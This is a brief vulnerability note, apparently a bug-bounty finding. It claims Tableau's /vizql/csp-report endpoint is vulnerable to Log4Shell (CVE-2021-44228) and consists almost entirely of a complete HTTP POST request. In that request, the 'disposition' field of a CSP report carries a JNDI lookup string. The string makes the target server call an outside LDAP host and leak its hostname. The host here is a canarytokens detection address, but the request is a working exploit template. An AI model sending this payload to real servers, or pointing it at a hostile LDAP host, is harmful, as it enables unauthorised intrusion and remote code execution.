 ## Tableau CSP in the endpoint "/vizql/csp-report/" are vulnerable to Log4Shell ( CVE-2021-44228). 
 The response may depend on the targets
 
 ```
POST /vizql/csp-report HTTP/2
Host: host.local
Content-Type: application/csp-report
Content-Length: 655
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
 
{"csp-report":{"document-uri":"https://<hostname>/","referrer":"","violated-directive":"script-src","effective-directive":"script-src","original-policy":"connect-src * https://*.*.*.com https://api.*.com; default-src blob:; font-src * data:; frame-src * data:; img-src * data: blob:; object-src data:; report-uri /vizql/csp-report; script-src * blob:; style-src * 'unsafe-inline'","disposition":"${jndi:ldap://x${hostname}.L4J.blah.blah.canarytokens.com/a}","blocked-uri":"eval","line-number":"5637","column-number":"25","source-file":"https://*.*.com/angular.min.js","status-code":"200","script-sample":""}}
 ```
